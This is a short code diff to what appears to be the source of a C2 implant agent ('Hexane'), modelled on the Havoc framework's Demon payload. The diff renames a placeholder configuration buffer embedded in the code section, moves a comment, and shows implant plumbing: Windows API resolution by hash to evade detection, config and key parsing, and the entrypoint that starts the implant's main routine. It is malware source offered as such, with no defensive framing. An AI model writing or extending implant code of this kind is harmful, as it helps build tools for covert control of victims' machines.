@@ -1,5 +1,6 @@
 #include <core/include/implant.hpp>
 namespace Implant {
+    __text(F) uint8_t _config[1024] = { "AAAAAAAA", };
 
     VOID MainRoutine() {
         HEXANE
@@ -39,6 +40,7 @@ namespace Implant {
 
     BOOL ResolveApi() {
         HEXANE
+        // resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
 
         bool            success     = true;
         OSVERSIONINFOW  OSVersionW  = { };
@@ -49,7 +51,6 @@ namespace Implant {
 
         x_assertb(F_PTR_HASHES(Ctx->nt.RtlGetVersion, NTDLL, RTLGETVERSION));
 
-        // WinVersion resolution : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
         Ctx->session.version = WIN_VERSION_UNKNOWN;
         OSVersionW.dwOSVersionInfoSize = sizeof(OSVersionW);
 
@@ -128,7 +129,6 @@ namespace Implant {
         return success;
     }
 
-    __text(F) uint8_t __config[1024] = { 0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41, };
 
     BOOL ReadConfig() {
         HEXANE
@@ -136,8 +136,8 @@ namespace Implant {
         bool    success = true;
         _parser parser  = { };
 
-        Parser::CreateParser(&parser, __config, sizeof(__config));
-        x_memset(__config, 0, sizeof(__config));
+        Parser::CreateParser(&parser, _config, sizeof(_config));
+        x_memset(_config, 0, sizeof(_config));
 
         Parser::ParserBytecpy(&parser, B_PTR(&Ctx->root));
         Parser::ParserMemcpy(&parser, &Ctx->config.key, nullptr);
@@ -302,5 +302,6 @@ VOID Entrypoint(HMODULE Base) {
     NT_ASSERT(Memory::Context::ContextInit());
     NT_ASSERT(Implant::ResolveApi());
     NT_ASSERT(Implant::ReadConfig());
+
     Implant::MainRoutine();
 }
